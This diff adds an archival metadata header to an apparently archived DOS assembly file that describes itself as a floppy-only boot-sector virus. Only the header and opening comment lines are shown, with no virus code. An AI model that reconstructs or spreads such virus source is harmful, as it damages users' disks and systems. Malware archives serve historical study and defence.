@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;-----------------------------------------------------------------------;
 ; This virus is of the "FLOPPY ONLY" variety.                           ;
 ; It replicates to the boot sector of a floppy disk and when it gains control  
